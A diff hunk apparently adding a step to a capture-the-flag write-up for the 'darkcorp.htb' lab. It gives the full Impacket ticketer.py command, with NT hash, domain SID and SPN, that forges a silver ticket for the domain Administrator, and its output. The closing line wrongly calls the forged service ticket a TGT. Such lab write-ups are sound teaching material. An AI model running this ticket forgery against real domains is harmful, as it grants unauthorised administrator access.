@@ -1011,6 +1011,24 @@ Certipy v5.1.0 - by Oliver Lyak (ly4k)
 
 Ill grab the NT hash, i can now use this to forge a silver ticket for the administrator
 
+```python
+ticketer.py -nthash '8f33c7fc7ff515c1f358e488fbb8b675' -domain-sid 'S-1-5-21-3432610366-2163336488-3604236847' -domain darkcorp.htb -spn 'cifs/web-01.darkcorp.htb' Administrator 
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Creating basic skeleton ticket and PAC Infos
+[*] Customizing ticket for darkcorp.htb/Administrator
+[*] 	PAC_LOGON_INFO
+[*] 	PAC_CLIENT_INFO_TYPE
+[*] 	EncTicketPart
+[*] 	EncTGSRepPart
+[*] Signing/Encrypting final ticket
+[*] 	EncTicketPart
+[*] 	EncTGSRepPart
+[*] Saving/Updating ticket in Administrator.ccache
+```
+
+I now have a TGT for the administrator
+
 
 
 
